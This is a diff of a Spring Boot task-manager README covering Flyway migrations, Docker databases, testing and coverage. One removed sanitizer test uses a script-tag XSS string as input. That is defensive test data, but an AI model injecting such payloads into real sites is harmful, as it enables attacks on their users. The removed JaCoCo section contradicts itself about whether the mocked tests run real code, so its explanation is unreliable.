+    FC->>FW: Flyway.configure().dataSource(ds).load()
+    Note over FC: @Bean(initMethod = "migrate")
+    FW->>DB: Check flyway_schema_history table
+    DB-->>FW: Return applied versions (V1, V2 ...)
+
+    alt New migrations found
+        FW->>DB: Execute V3__Add_audit_fields.sql
+        FW->>DB: Record in flyway_schema_history
+    end
+
+    FW-->>App: Migration complete
+    App->>HB: Initialize EntityManagerFactory
+    HB->>DB: Validate schema (ddl-auto: validate)
+    Note over HB,DB: Schema matches @Entity? ✅ Boot continues
+```
+
+Flyway manages the database schema through versioned SQL files:
+
+```
+src/main/resources/db/migration/
+├── V1__init_schema.sql          ← Creates the tasks table
+├── V2__add_soft_delete.sql      ← Adds the deleted column + index
+└── V3__Add_audit_fields.sql     ← Adds created_at, last_modified_at, deleted_at
+```
+
+### Naming Convention
+
+```
+V1__init_schema.sql
+│ │  └─ Description (underscores for spaces)
+│ └──── Double underscore separator
+└────── Version number (must be sequential)
+```
+
+### Migration History
+
+Flyway creates a `flyway_schema_history` table in the database:
+
+| Version | Description | Checksum | Installed On |
+|---|---|---|---|
+| 1 | init schema | -123456 | 2026-01-15 |
+| 2 | add soft delete | -789012 | 2026-01-20 |
+| 3 | Add audit fields | -345678 | 2026-02-01 |
+
+**Once a migration is applied, it must never be modified.** Flyway checksums each file. If you change an already-applied migration, Flyway will refuse to start.
+
+### V1 — Initial Schema
+
+```sql
+CREATE TABLE tasks (
+    id BIGSERIAL PRIMARY KEY,          -- PostgreSQL auto-incrementing 64-bit integer
+    title VARCHAR(100) NOT NULL,
+    description VARCHAR(500),
+    completed BOOLEAN DEFAULT FALSE NOT NULL
+);
+
+ALTER TABLE tasks ADD CONSTRAINT uc_task_title UNIQUE (title);
+```
+
+### V2 — Soft Delete
+
+```sql
+ALTER TABLE tasks ADD COLUMN deleted BOOLEAN DEFAULT FALSE NOT NULL;
+CREATE INDEX idx_tasks_deleted ON tasks(deleted);  -- Performance: most queries filter by deleted
+```
+
+### V3 — Audit Fields
+
+```sql
+ALTER TABLE tasks ADD COLUMN created_at TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP;
+ALTER TABLE tasks ADD COLUMN last_modified_at TIMESTAMP;
+ALTER TABLE tasks ADD COLUMN deleted_at TIMESTAMP;
+```
+
+---
+
+## 15. Docker Setup
+
+### Infrastructure Diagram
+
+```mermaid
+graph TB
+    subgraph Host["🖥️ Developer Machine (localhost)"]
+        subgraph AppLayer["Application Layer"]
+            APP["🟢 TaskManagerApplication<br/>./gradlew bootRun<br/>port 9090"]
+            TEST["🧪 ./gradlew test<br/>(JUnit 5)"]
+        end
+
+        subgraph DockerLayer["Docker Containers"]
+            subgraph DevContainer["docker-compose.yml"]
+                DEV_PG["🐘 postgres<br/>PostgreSQL 16<br/>Container port: 5432"]
+            end
+
+            subgraph TestContainer["docker-compose-test.yml"]
+                TEST_PG["🐘 postgres-test<br/>PostgreSQL 16<br/>Container port: 5432"]
+            end
+        end
+    end
+
+    APP -- "jdbc:postgresql://<br/>localhost:5432/taskdb" --> DEV_PG
+    TEST -- "jdbc:postgresql://<br/>localhost:5433/taskdb" --> TEST_PG
+
+    DEV_PG -.- |"Host port 5432<br/>↕ Container 5432"| P1["Port Mapping"]
+    TEST_PG -.- |"Host port 5433<br/>↕ Container 5432"| P2["Port Mapping"]
+
+    style APP fill:#6DB33F,color:#fff
+    style TEST fill:#FFC107,color:#000
+    style DEV_PG fill:#336791,color:#fff
+    style TEST_PG fill:#336791,color:#fff
+    style P1 fill:none,stroke:none
+    style P2 fill:none,stroke:none
+```
+
+### Development Database — `docker-compose.yml`
 
 ```yaml
 services:
@@ -699,583 +1299,482 @@ services:
       POSTGRES_PASSWORD: docker
       POSTGRES_DB: taskdb
     ports:
-      - "5432:5432"
+      - "5432:5432"         # Host port 5432 → Container port 5432
 ```
 
-To start the database:
+### Test Database — `docker-compose-test.yml`
+
+```yaml
+services:
+  db:
+    image: postgres:16
+    container_name: postgres-test
+    environment:
+      POSTGRES_USER: docker
+      POSTGRES_PASSWORD: docker
+      POSTGRES_DB: taskdb
+    ports:
+      - "5433:5432"         # Host port 5433 → Container port 5432 (different port!)
+```
+
+**Why separate databases?** Tests may truncate tables, insert test data, and run Flyway `clean`. Running tests against the dev database would destroy your development data.
+
+### Usage
+
 ```bash
-docker compose up -d
+# Start dev database
+docker-compose up -d
+
+# Start test database (separate container, different port)
+docker-compose -f docker-compose-test.yml up -d
+
+# Run the application (connects to port 5432)
+./gradlew bootRun
+
+# Run tests (connects to port 5433)
+./gradlew test
 ```
 
 ---
 
-## 7. Complete Request Lifecycle — Step by Step
+## 16. Application Configuration — YAML
 
-Let's trace a `POST /api/tasks` request with body:
-```json
+### Main Configuration (`src/main/resources/application.yaml`)
+
+```yaml
+spring:
+  datasource:
+    url: jdbc:postgresql://localhost:5432/taskdb
+    username: ${DB_USERNAME:docker}    # Environment variable with default
+    password: ${DB_PASSWORD:docker}
+
+  jpa:
+    hibernate:
+      ddl-auto: validate              # Validate schema matches entities, don't modify
+
+  flyway:
+    enabled: true
+    baseline-on-migrate: true
+
+  threads:
+    virtual:
+      enabled: true                   # Java 25 Virtual Threads for Tomcat
+```
+
+### `${DB_USERNAME:docker}` Syntax
+
+This is a Spring expression:
+- Look for environment variable `DB_USERNAME`
+- If not found, use `"docker"` as default
+- In production: set `DB_USERNAME=prod_user` in the environment
+- In development: the default `docker` matches the Docker Compose config
+
+### `ddl-auto` Options
+
+| Value | Meaning | Use Case |
+|---|---|---|
+| `none` | Don't touch the schema | Production (Flyway manages it) |
+| `validate` | Check entity ↔ schema match, fail if mismatch | Production (extra safety check) |
+| `update` | Auto-alter tables to match entities | ⚠️ Never in production |
+| `create-drop` | Drop & recreate on every startup | Tests only |
+
+### Test Configuration (`src/test/resources/application.yaml`)
+
+```yaml
+spring:
+  datasource:
+    url: jdbc:postgresql://localhost:5433/taskdb    # ← Port 5433 (test container)
+  jpa:
+    hibernate:
+      ddl-auto: none                                 # ← Flyway manages schema
+server:
+  port: 0                                            # ← Random port for tests
+```
+
+---
+
+## 17. Testing Strategy
+
+### Test Coverage Map — Who Tests What?
+
+```mermaid
+graph LR
+    subgraph Tests["Test Classes"]
+        TCT["TaskControllerTest<br/>(MockMvc)"]
+        TST["TaskServiceTest<br/>(Mockito)"]
+        TMT["TaskMapperTest<br/>(@SpringBootTest)"]
+        SST["SanitizationServiceTest"]
+        GEHT["GlobalExceptionHandlerTest"]
+        TSPT["TaskSpecificationsTest"]
+        ERT["ErrorResponseTest"]
+        TDTT["TaskDTOTest"]
+        TT["TaskTest"]
+        TNFT["TaskNotFoundExceptionTest"]
+        DTET["DuplicateTaskExceptionTest"]
+        TMAT["TaskManagerApplicationTests<br/>(Smoke)"]
+    end
+
+    subgraph Sources["Source Classes"]
+        TC["TaskController"]
+        TS["TaskService"]
+        TM["TaskMapper + Impl"]
+        SS["SanitizationService"]
+        GEH["GlobalExceptionHandler"]
+        TSP["TaskSpecifications"]
+        ER["ErrorResponse"]
+        REQD["TaskRequestDTO"]
+        RESD["TaskResponseDTO"]
+        TASK["Task (Entity)"]
+        TNF["TaskNotFoundException"]
+        DTE["DuplicateTaskException"]
+        APP["TaskManagerApplication"]
+        JC["JpaConfig"]
+        FC["FlywayConfig"]
+    end
+
+    TCT --> TC
+    TST --> TS
+    TMT --> TM
+    SST --> SS
+    GEHT --> GEH
+    TSPT --> TSP
+    ERT --> ER
+    TDTT --> REQD
+    TDTT --> RESD
+    TT --> TASK
+    TNFT --> TNF
+    DTET --> DTE
+    TMAT --> APP
+    TMAT --> JC
+    TMAT --> FC
+
+    style TCT fill:#4CAF50,color:#fff
+    style TST fill:#4CAF50,color:#fff
+    style TMT fill:#2196F3,color:#fff
+    style TMAT fill:#2196F3,color:#fff
+    style SST fill:#81C784,color:#000
+    style GEHT fill:#81C784,color:#000
+    style TSPT fill:#81C784,color:#000
+```
+
+### Test Pyramid
+
+```
+                 ┌──────────┐
+                 │ @Spring  │  TaskManagerApplicationTests (smoke test)
+                 │ BootTest │  TaskMapperTest (mapper with Spring context)
+                 └──────────┘
+               ┌──────────────┐
+               │  Unit Tests  │  TaskServiceTest (Mockito)
+               │  (MockMvc)   │  TaskControllerTest (standalone MockMvc)
+               └──────────────┘
+          ┌────────────────────────┐
+          │   Pure Unit Tests      │  SanitizationServiceTest
+          │   (No Spring context)  │  GlobalExceptionHandlerTest
+          │                        │  TaskSpecificationsTest
+          │                        │  ErrorResponseTest, DTOTest, TaskTest
+          │                        │  TaskNotFoundExceptionTest, etc.
+          └────────────────────────┘
+```
+
+### Test Categories
+
+| Test Class | Type | Spring Context? | Database? | What It Tests |
+|---|---|---|---|---|
+| `TaskControllerTest` | Unit (MockMvc) | ❌ | ❌ | HTTP status codes, JSON shapes, validation errors |
+| `TaskServiceTest` | Unit (Mockito) | ❌ | ❌ | Business logic, sanitization ordering, duplicate check |
+| `TaskMapperTest` | Integration | ✅ (DB excluded) | ❌ | MapStruct field mappings, expression evaluations |
+| `SanitizationServiceTest` | Unit | ❌ | ❌ | XSS stripping, null handling, policy failure modes |
+| `GlobalExceptionHandlerTest` | Unit | ❌ | ❌ | Exception → ErrorResponse mapping |
+| `TaskSpecificationsTest` | Unit (Mockito) | ❌ | ❌ | JPA Criteria predicates |
+| `TaskManagerApplicationTests` | Integration | ✅ | ✅ (real Postgres) | Full context smoke test + Flyway migrations |
+| `ErrorResponseTest` | Unit | ❌ | ❌ | Constructor, builder, all fields |
+| `TaskDTOTest` | Unit | ❌ | ❌ | Lombok-generated code coverage |
+| `TaskTest` | Unit | ❌ | ❌ | Entity builder, @Builder.Default |
+| `TaskNotFoundExceptionTest` | Unit | ❌ | ❌ | Message format |
+| `DuplicateTaskExceptionTest` | Unit | ❌ | ❌ | Message preservation |
+
+### Jackson 3.x in Spring Boot 4.x
+
+Spring Boot 4.0.3 ships with **Jackson 3.x** (`tools.jackson.core:jackson-databind:3.0.4`). The package moved from `com.fasterxml.jackson` to `tools.jackson`. In test code:
+
+```java
+import tools.jackson.databind.ObjectMapper;  // NOT com.fasterxml.jackson
+```
+
+This only affects tests that manually create `ObjectMapper`. Spring's internal `MockMvc` handles serialisation automatically.
+
+---
+
+## 18. Request Lifecycle — End-to-End Walkthrough
+
+### Sequence Diagram — `POST /api/tasks`
+
+```mermaid
+sequenceDiagram
+    actor Client
+    participant Tomcat as Embedded Tomcat
+    participant Valid as Bean Validator<br/>(@Valid)
+    participant TC as TaskController
+    participant TS as TaskService
+    participant SS as SanitizationService<br/>(AntiSamy)
+    participant TR as TaskRepository
+    participant TM as TaskMapper<br/>(MapStruct)
+    participant DB as PostgreSQL
+
+    Client->>Tomcat: POST /api/tasks<br/>{"title":"<b>Buy Groceries</b>","completed":false}
+    Tomcat->>Valid: Validate @RequestBody
+
+    alt Validation fails
+        Valid-->>Client: 400 Bad Request<br/>{"errors":{"title":"..."}}
+    end
+
+    Valid->>TC: createTask(requestDto)
+    TC->>TS: createTask(requestDto)
+
+    Note over TS: @Transactional begins
+
+    TS->>SS: sanitize(title)
+    SS-->>TS: "Buy Groceries" (HTML stripped)
+    TS->>SS: sanitize(description)
+    SS-->>TS: description (unchanged)
+
+    TS->>TR: existsByHeaderAndCompletedFalse("Buy Groceries")
+    TR->>DB: SELECT COUNT(*) > 0 FROM tasks<br/>WHERE title=? AND completed=false AND deleted=false
+    DB-->>TR: false
+    TR-->>TS: false (no duplicate)
+
+    TS->>TM: toEntity(requestDto)
+    TM-->>TS: Task{header="Buy Groceries", id=null}
+
+    TS->>TR: save(taskEntity)
+    TR->>DB: INSERT INTO tasks(title, description, completed, deleted, created_at)<br/>VALUES('Buy Groceries', null, false, false, NOW())
+    DB-->>TR: Task{id=1, ...}
+    Note over DB: @CreatedDate → created_at = NOW()
+
+    TR-->>TS: savedTask{id=1}
+
+    TS->>TM: toDTO(savedTask)
+    TM-->>TS: TaskResponseDTO{id=1, title="Buy Groceries",<br/>completionStatus="PENDING"}
+
+    Note over TS: @Transactional commits
+
+    TS-->>TC: responseDTO
+    TC-->>Tomcat: ResponseEntity 200 OK
+    Tomcat-->>Client: {"id":1,"title":"Buy Groceries",<br/>"completionStatus":"PENDING",...}
+```
+
+### Sequence Diagram — `DELETE /api/tasks/{id}` (Soft Delete)
+
+```mermaid
+sequenceDiagram
+    actor Client
+    participant TC as TaskController
+    participant TS as TaskService
+    participant TR as TaskRepository
+    participant DB as PostgreSQL
+
+    Client->>TC: DELETE /api/tasks/1
+    TC->>TS: deleteTask(1)
+
+    Note over TS: @Transactional begins
+
+    TS->>TR: findById(1)
+    TR->>DB: SELECT * FROM tasks WHERE id=1 AND deleted=false
+    DB-->>TR: Task{id=1, header="Buy Groceries"}
+    TR-->>TS: Optional.of(task)
+
+    TS->>TR: delete(task)
+    Note over TR: @SQLDelete intercepts!
+    TR->>DB: UPDATE tasks SET deleted=true, deleted_at=NOW() WHERE id=1
+    Note over DB: Row stays in DB, just hidden
+
+    Note over TS: @Transactional commits
+
+    TS-->>TC: void
+    TC-->>Client: 204 No Content (empty body)
+```
+
+### `POST /api/tasks` — Creating a Task
+
+```
+Client sends:
 {
   "title": "<b>Buy Groceries</b>",
   "description": "Milk and eggs",
   "completed": false
 }
-```
 
-**Step 1 — HTTP arrives at Tomcat**
-Spring Boot's embedded Tomcat server receives the HTTP request.
+     ┌─────────────────────────────────────────────────────────────┐
+  1. │ Tomcat receives HTTP request                                 │
+     │ Spring MVC matches @PostMapping → TaskController.createTask  │
+     └────────────────────┬────────────────────────────────────────┘
+                          │
+  2. │ @Valid triggers Bean Validation                              │
+     │ @NotBlank on title? ✅ (not blank)                           │
+     │ @Size(min=3,max=100)? ✅ (17 chars)                         │
+     │ @NotNull on completed? ✅ (false ≠ null)                     │
+     │ If validation FAILS → MethodArgumentNotValidException → 400  │
+     └────────────────────┬────────────────────────────────────────┘
+                          │
+  3. │ TaskService.createTask(requestDto)                           │
+     │ Step 1: sanitizeRequest() → AntiSamy strips <b> tags        │
+     │   title: "<b>Buy Groceries</b>" → "Buy Groceries"           │
+     │   description: "Milk and eggs" → "Milk and eggs" (unchanged) │
+     └────────────────────┬────────────────────────────────────────┘
+                          │
+  4. │ Step 2: Duplicate check                                     │
+     │ existsByHeaderAndCompletedFalse("Buy Groceries") → false    │
+     │ If true → DuplicateTaskException → 409 Conflict              │
+     └────────────────────┬────────────────────────────────────────┘
+                          │
+  5. │ Step 3: taskMapper.toEntity(requestDto)                     │
+     │ TaskRequestDTO { title="Buy Groceries" }                     │
+     │   → Task { header="Buy Groceries", id=null, deleted=false }  │
+     └────────────────────┬────────────────────────────────────────┘
+                          │
+  6. │ Step 4: taskRepository.save(taskEntity)                     │
+     │ INSERT INTO tasks (title, description, completed, deleted,   │
+     │   created_at) VALUES ('Buy Groceries', 'Milk and eggs',      │
+     │   false, false, NOW())                                       │
+     │ Returns Task { id=1, header="Buy Groceries", ... }           │
+     └────────────────────┬────────────────────────────────────────┘
+                          │
+  7. │ Step 5: taskMapper.toDTO(savedTask)                         │
+     │ Task { id=1, header="Buy Groceries", completed=false }       │
+     │   → TaskResponseDTO { id=1, title="Buy Groceries",           │
+     │     completed=false, completionStatus="PENDING" }            │
+     └────────────────────┬────────────────────────────────────────┘
+                          │
+  8. │ Jackson serialises TaskResponseDTO → JSON response           │
+     │ HTTP 200 OK                                                  │
+     └─────────────────────────────────────────────────────────────┘
 
-**Step 2 — DispatcherServlet routes it**
-Spring's `DispatcherServlet` (the "front controller") looks at the URL `/api/tasks` and method `POST`, and routes it to `TaskController.createTask()`.
-
-**Step 3 — @RequestBody deserialization**
-Jackson (the JSON library) reads the request body and creates a `TaskRequestDTO` object.
-
-**Step 4 — @Valid validation**
-Jakarta Bean Validation checks the constraints:
-- `title` = `"<b>Buy Groceries</b>"` — NOT blank ✓, length OK ✓ (validation passes, sanitization comes later)
-- `completed` = `false` — NOT null ✓
-
-If validation fails here, `MethodArgumentNotValidException` is thrown → GlobalExceptionHandler returns 400.
-
-**Step 5 — TaskController delegates to TaskService**
-```java
-return taskService.createTask(requestDto);
-```
-
-**Step 6 — SanitizationService strips HTML**
-```
-"<b>Buy Groceries</b>" → "Buy Groceries"
-```
-The `<b>` tag is harmless but AntiSamy strips all tags with the strict slashdot policy.
-
-**Step 7 — Duplicate check**
-```java
-taskRepository.existsByHeaderAndCompletedFalse("Buy Groceries")
-// SQL: SELECT COUNT(*) > 0 FROM tasks WHERE title = 'Buy Groceries' AND completed = false
-// Result: false (no duplicate) — proceed
-```
-
-**Step 8 — MapStruct converts DTO → Entity**
-```
-TaskRequestDTO { title: "Buy Groceries", description: "Milk and eggs", completed: false }
-    ↓  (TaskMapper.toEntity)
-Task { id: null, header: "Buy Groceries", description: "Milk and eggs", completed: false }
-```
-Note: `title → header` (field name change), `id = null` (DB generates it).
-
-**Step 9 — Hibernate saves to database**
-```sql
-INSERT INTO tasks (title, description, completed) VALUES ('Buy Groceries', 'Milk and eggs', false);
--- DB assigns id = 7 (for example)
-```
-`taskRepository.save()` returns the saved entity with `id = 7`.
-
-**Step 10 — MapStruct converts Entity → ResponseDTO**
-```
-Task { id: 7, header: "Buy Groceries", description: "Milk and eggs", completed: false }
-    ↓  (TaskMapper.toDTO)
-TaskResponseDTO { id: 7, title: "Buy Groceries", description: "Milk and eggs",
-                  completed: false, completionStatus: "PENDING" }
-```
-Note: `header → title`, and `completionStatus` is computed as `"PENDING"` (since `completed = false`).
-
-**Step 11 — Jackson serializes to JSON**
-```json
+Response:
 {
-  "id": 7,
+  "id": 1,
   "title": "Buy Groceries",
   "description": "Milk and eggs",
   "completed": false,
-  "completionStatus": "PENDING"
-}
-```
-
-**Step 12 — HTTP 200 OK response sent**
-The controller returns this JSON with HTTP 200.
-
----
-
-## 8. Spring Boot Key Concepts Explained
-
-### Dependency Injection (DI)
-
-Instead of writing:
-```java
-private TaskService taskService = new TaskService(new TaskRepository(), new TaskMapper(), ...);
-```
-
-You write:
-```java
-private final TaskService taskService;  // Spring injects this
-```
-
-Spring manages the creation and wiring of all objects. This is called **Inversion of Control (IoC)**.
-
-### Spring Beans
-
-Any class annotated with `@Component`, `@Service`, `@Repository`, or `@Controller` is a **Spring Bean** — Spring creates one instance and manages its lifecycle.
-
-| Annotation | Used for |
-|---|---|
-| `@Component` | Generic component |
-| `@Service` | Business logic layer |
-| `@Repository` | Data access layer |
-| `@RestController` | HTTP endpoint handler |
-
-### Constructor Injection with `@RequiredArgsConstructor`
-
-```java
-@Service
-@RequiredArgsConstructor
-public class TaskService {
-    private final TaskRepository taskRepository;  // 'final' + no initialization
-    private final TaskMapper taskMapper;
-    // ...
-}
-```
-
-Lombok's `@RequiredArgsConstructor` generates:
-```java
-public TaskService(TaskRepository taskRepository, TaskMapper taskMapper, ...) {
-    this.taskRepository = taskRepository;
-    this.taskMapper = taskMapper;
-    // ...
-}
-```
-
-Spring sees this constructor and automatically injects the matching beans. Constructor injection is preferred because it makes dependencies explicit and enables immutability.
-
-### Optional and `orElseThrow`
-
-```java
-Optional<Task> optTask = taskRepository.findById(id);
-// optTask might contain a Task, or it might be empty
-
-Task task = optTask.orElseThrow(() -> new TaskNotFoundException(id));
-// If present: unwrap and return the Task
-// If empty:   throw TaskNotFoundException
-```
-
-`Optional` forces you to explicitly handle the "not found" case, preventing `NullPointerExceptions`.
-
-### `@Transactional`
-
-```java
-@Transactional
-public TaskResponseDTO createTask(TaskRequestDTO requestDto) {
-    // All DB operations here are wrapped in one transaction
-    // If ANYTHING throws an exception → all changes are rolled back
+  "completionStatus": "PENDING",
+  "createdAt": "2026-03-04T10:30:00",
+  "lastModifiedAt": "2026-03-04T10:30:00"
 }
 ```
 
 ---
 
-## 9. Testing Strategy
+## 19. Key Design Decisions & Trade-offs
 
-### 9.1 Test Types Used
+### 1. Soft Delete vs Hard Delete
 
-| Test Class | Type | Spring Context? | What it tests |
-|---|---|---|---|
-| `TaskControllerTest` | Unit | ❌ No (Mockito + standalone MockMvc) | HTTP layer: routes, validation, error handling |
-| `TaskServiceTest` | Unit | ❌ No (Mockito only) | Business logic: CRUD, duplicate check, 404 |
-| `SanitizationServiceTest` | Unit | ❌ No (plain instantiation) | XSS sanitization logic |
-| `GlobalExceptionHandlerTest` | Unit | ❌ No (plain instantiation) | Exception → HTTP status mapping |
-| `TaskMapperTest` | Integration | ✅ Yes (@SpringBootTest, H2) | MapStruct field mappings |
-| `TaskManagerApplicationTests` | Integration | ✅ Yes (non-web) | Application context starts successfully |
-
-**Fast tests (no Spring context)** run in milliseconds. **Integration tests** take longer because they start a Spring context and connect to a database.
-
-### 9.2 TaskControllerTest
-
-Uses `@ExtendWith(MockitoExtension.class)` + standalone MockMvc. No Spring context needed.
-
-```java
-@ExtendWith(MockitoExtension.class)
-class TaskControllerTest {
-    private MockMvc mockMvc;
-
-    @Mock
-    private TaskService taskService;  // Fake TaskService
-
-    @InjectMocks
-    private TaskController taskController;  // Real controller with fake service
-
-    @BeforeEach
-    void setUp() {
-        LocalValidatorFactoryBean validator = new LocalValidatorFactoryBean();
-        validator.afterPropertiesSet();
-        mockMvc = MockMvcBuilders
-                .standaloneSetup(taskController)
-                .setControllerAdvice(new GlobalExceptionHandler())
-                .setValidator(validator)
-                .build();
-    }
-}
-```
-
-**What `standaloneSetup` does:** Creates a minimal MockMvc that only loads the specified controller(s) — much faster than loading the full Spring context. The `GlobalExceptionHandler` is wired in explicitly.
-
-**Example test:**
-```java
-@Test
-void getAllTasks_ReturnsList() throws Exception {
-    when(taskService.getAllTasks()).thenReturn(List.of(sampleResponse));
-
-    mockMvc.perform(get("/api/tasks"))
-           .andExpect(status().isOk())
-           .andExpect(jsonPath("$[0].title").value("Buy Groceries"));
-}
-```
-
-Pattern: **Arrange** (mock behaviour) → **Act** (perform request) → **Assert** (check response).
-
-### 9.3 TaskServiceTest
-
-Uses only Mockito. Mocks all three collaborators.
-
-```java
-@ExtendWith(MockitoExtension.class)
-class TaskServiceTest {
-    @Mock private TaskRepository taskRepository;
-    @Mock private TaskMapper taskMapper;
-    @Mock private SanitizationService sanitizationService;
-
-    @InjectMocks
-    private TaskService taskService;
-}
-```
-
-**Key patterns:**
-```java
-// When the repository is asked for task #1, return sampleTask:
-when(taskRepository.findById(1L)).thenReturn(Optional.of(sampleTask));
-
-// Assert an exception is thrown:
-assertThatThrownBy(() -> taskService.getTaskById(999L))
-    .isInstanceOf(TaskNotFoundException.class);
-
-// Verify the repository was actually called:
-verify(taskRepository).findById(1L);
-verify(taskRepository, never()).save(any());
-```
-
-### 9.4 SanitizationServiceTest
-
-No mocking needed — tests the real AntiSamy sanitization:
-```java
-class SanitizationServiceTest {
-    private SanitizationService sanitizationService;
-
-    @BeforeEach
-    void setUp() {
-        sanitizationService = new SanitizationService(); // just new it up directly
-    }
-
-    @Test
-    void stripsScriptTags() {
-        String dirty = "<script>alert('xss')</script>Buy groceries";
-        String clean = sanitizationService.sanitize(dirty);
-        assertThat(clean).doesNotContain("<script>");
-        assertThat(clean).doesNotContain("alert");
-    }
-}
-```
-
-### 9.5 GlobalExceptionHandlerTest
-
-Tests the handler methods directly, without MockMvc:
-```java
-class GlobalExceptionHandlerTest {
-    private GlobalExceptionHandler handler;
-
-    @BeforeEach
-    void setUp() { handler = new GlobalExceptionHandler(); }
-
-    @Test
-    void handleTaskNotFound_Returns404() {
-        ResponseEntity<ErrorResponse> response =
-            handler.handleTaskNotFound(new TaskNotFoundException(42L));
-
-        assertThat(response.getStatusCode()).isEqualTo(HttpStatus.NOT_FOUND);
-        assertThat(response.getBody().getStatus()).isEqualTo(404);
-    }
-}
-```
-
-### 9.6 TaskMapperTest
-
-Uses `@SpringBootTest` with H2 to load the MapStruct-generated mapper bean:
-```java
-@SpringBootTest
-class TaskMapperTest {
-
-    @Autowired
-    private TaskMapper taskMapper;   // Injects MapStruct-generated TaskMapperImpl
-
-    @Test
-    void mapsAllFieldsForIncompleteTask() {
-        Task task = new Task(1L, "Buy Groceries", "Milk and eggs", false);
-        TaskResponseDTO dto = taskMapper.toDTO(task);
-
-        assertThat(dto.getTitle()).isEqualTo("Buy Groceries");    // header → title
-        assertThat(dto.getCompletionStatus()).isEqualTo("PENDING"); // computed
-    }
-}
-```
-
-The test `application.yaml` in `src/test/resources/` uses H2, so no PostgreSQL server is needed.
-
-### 9.7 TaskManagerApplicationTests
-
-Verifies the application context starts without errors:
-```java
-class TaskManagerApplicationTests {
-    @Test
-    void mainStartsAndStops() {
-        SpringApplication app = new SpringApplication(TaskManagerApplication.class);
-        app.setWebApplicationType(WebApplicationType.NONE); // No web server — just context
-        try (ConfigurableApplicationContext context = app.run()) {
-            // If it reaches here, the context started successfully
-        }
-    }
-}
-```
-
-`WebApplicationType.NONE` means no Tomcat server starts — just the Spring application context (with H2 database). This makes the test fast.
-
----
-
-## 10. Code Coverage with JaCoCo
-
-**JaCoCo** (Java Code Coverage) measures which lines of code are actually executed during your tests.
-
-### Generating the Report
-
-Run the tests (coverage is generated automatically after every test run):
-
-```bash
-./gradlew test
-```
-
-This is because of the Gradle configuration:
-```kotlin
-tasks.withType<Test> {
-    finalizedBy(tasks.jacocoTestReport)  // Always run after tests
-}
-```
-
-### Viewing the Report
-
-**HTML report** (human-readable, open in browser):
-```
-build/reports/jacoco/test/html/index.html
-```
-
-Open this file in your browser to see a breakdown by package, class, and method.
-
-**XML report** (for tools like SonarQube or CI/CD pipelines):
-```
-build/reports/jacoco/test/jacocoTestReport.xml
-```
-
-### Reading the HTML Report
-
-The report shows:
-- **Green** = covered by tests
-- **Red** = NOT covered by tests
-- **Yellow** = partially covered (e.g., one branch of an if-statement)
-
-Metrics:
-| Metric | Meaning |
-|---|---|
-| **Instructions** | Individual bytecode instructions executed |
-| **Branches** | Both `true` and `false` paths of conditions covered |
-| **Lines** | Lines that were executed |
-| **Methods** | Methods that were called |
-| **Classes** | Classes that were instantiated or used |
-
----
-
-### Your Current Coverage (from `jacocoTestReport.xml`)
-
-The existing JaCoCo report (generated from the last test run) shows the following numbers across the entire project:
-
-| Metric | Covered | Missed | Total | Coverage % |
-|---|---|---|---|---|
-| **Instructions** | 38 | 420 | 458 | **~8.3%** |
-| **Branches** | 1 | 19 | 20 | **~5%** |
-| **Lines** | 13 | 112 | 125 | **~10.4%** |
-| **Methods** | 5 | 27 | 32 | **~15.6%** |
-| **Classes** | 4 | 5 | 9 | **~44%** |
-
-#### Why is coverage so low when all tests pass?
-
-This is a very important concept to understand. Your unit tests (using Mockito) **mock** out the real classes, so JaCoCo never sees your actual code being exercised:
-
-```
-TaskServiceTest:
-  @Mock private TaskRepository taskRepository;  ← fake — real TaskService code NOT executed
-  @Mock private TaskMapper taskMapper;           ← fake
-  @InjectMocks private TaskService taskService;  ← real TaskService, but its collaborators are fakes
-```
-
-JaCoCo tracks which **real bytecode** runs. When `taskRepository.findById(1L)` is called on a Mockito mock, the real `TaskRepository` and real `TaskService` internal logic are still invoked — BUT the service methods themselves **are** exercised. However, since the last test run only ran `TaskManagerApplicationTests` (which boots the context with no web and does no CRUD operations), almost none of the real application code was actually called.
-
-#### Per-package breakdown
-
-| Package | Instructions Covered | Instructions Missed | Coverage |
-|---|---|---|---|
-| `com.taskmanager.app` (main class) | 3 | 5 | ~37% |
-| `com.taskmanager.app.controller` | 0 | 27 | **0%** |
-| `com.taskmanager.app.service` | 29 | 204 | ~12% |
-| `com.taskmanager.app.mapper` | 3 | 60 | ~5% |
-| `com.taskmanager.app.exception` | 3 | 124 | ~2% |
-| `com.taskmanager.app.repository` | 0 | 0 | N/A (interface) |
-| `com.taskmanager.app.model` | 0 | 0 | N/A (Lombok generated) |
-| `com.taskmanager.app.dto` | 0 | 0 | N/A (Lombok generated) |
-
-#### How to get accurate coverage from Mockito-based unit tests
-
-Your unit tests DO test the real service/controller logic, but since they use Mockito mocks the JaCoCo numbers appear misleadingly low. The reason is that your tests are correct — they isolate the unit under test. To make JaCoCo reflect this properly, you need to ensure the test classes themselves exercise the real code paths.
-
-**Your unit tests are testing correctly.** The low JaCoCo numbers are largely because the `TaskManagerApplicationTests` boots the context but makes no API calls — it's just a smoke test that the context loads. Meanwhile, the other tests (using Mockito) DO call the real methods but only on Mockito-managed objects.
-
-To improve JaCoCo numbers, you could add integration tests that make real HTTP calls through MockMvc with `@SpringBootTest` — those would exercise the real service, mapper, and repository code together.
-
----
-
-### Understanding Coverage Numbers
-
-**100% coverage does NOT mean your code is bug-free.** It only means every line was executed at least once. You still need meaningful assertions.
-
-**Typical coverage targets:**
-- Service layer: aim for 80–100%
-- Controller layer: aim for 80–100%
-- Exception handling: aim for 90–100%
-- Mapper: aim for 100% (it's generated code, but verify the mappings)
-
----
-
-## 11. API Reference
-
-Base URL: `http://localhost:9090`
-
-### GET /api/tasks
-Returns all tasks.
-
-**Response:**
-```json
-[
-  {
-    "id": 1,
-    "title": "Buy Groceries",
-    "description": "Milk and eggs",
-    "completed": false,
-    "completionStatus": "PENDING"
-  }
-]
-```
-
-### GET /api/tasks/{id}
-Returns a single task.
-
-**Response:** Same structure as one element above.
-
-**Error (not found):**
-```json
-{ "status": 404, "error": "Not Found", "message": "Task with ID 99 not found", "timestamp": "..." }
-```
-
-### POST /api/tasks
-Creates a new task.
-
-**Request body:**
-```json
-{
-  "title": "Buy Groceries",
-  "description": "Milk and eggs",
-  "completed": false
-}
-```
-
-**Response:** `200 OK` with the created task (includes DB-generated `id`).
-
-**Validation error:**
-```json
-{
-  "status": 400,
-  "error": "Bad Request",
-  "message": "Validation failed for one or more fields",
-  "errors": { "title": "Title is required" },
-  "timestamp": "..."
-}
-```
-
-### PUT /api/tasks/{id}
-Updates an existing task.
-
-**Request body:** Same as POST.
-
